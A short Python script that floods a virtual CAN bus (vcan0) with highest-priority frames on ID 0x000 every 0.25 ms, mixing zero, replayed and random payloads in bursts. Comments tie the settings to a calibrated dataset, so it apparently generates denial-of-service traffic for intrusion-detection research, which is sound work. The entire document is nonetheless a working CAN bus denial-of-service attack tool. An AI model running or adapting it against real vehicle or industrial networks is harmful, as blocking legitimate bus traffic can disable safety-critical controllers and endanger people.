import can
import time
import random

bus = can.interface.Bus(channel="vcan0", bustype="socketcan")

DOS_ID = 0x000
FLOOD_INTERVAL_S = 0.00025          # 0.25ms — matches your calibrated flood rate
BURST_MIN, BURST_MAX = 2, 40         # segment length range, matches your mixed-payload segments
ZERO_PAYLOAD_PROB = 0.40             # matches your dataset's zero-payload segment fraction
REPLAY_PROB       = 0.25             # matches your replay-segment fraction (remainder = random)
DURATION_S = 4

def random_payload():
    return [random.randint(0, 255) for _ in range(8)]

start = time.time()
print("[+] Starting DoS flood on ID 0x000")

try:
    while time.time() - start < DURATION_S:
        segment_len = random.randint(BURST_MIN, BURST_MAX)
        r = random.random()

        if r < ZERO_PAYLOAD_PROB:
            segment_payload = [0]*8                  # zero-payload segment
        elif r < ZERO_PAYLOAD_PROB + REPLAY_PROB:
            segment_payload = random_payload()        # replay: fixed for whole segment
        else:
            segment_payload = None                     # random: fresh payload every frame

        for _ in range(segment_len):
            if time.time() - start >= DURATION_S:
                break
            data = segment_payload if segment_payload is not None else random_payload()
            msg = can.Message(arbitration_id=DOS_ID, data=data, is_extended_id=False)
            try:
                bus.send(msg)
            except can.CanError as e:
                print("Send error:", e)
            time.sleep(FLOOD_INTERVAL_S)

except KeyboardInterrupt:
    print("\n[!] Stopped safely")

print(f"[+] DoS flood complete: {time.time()-start:.2f}s elapsed")
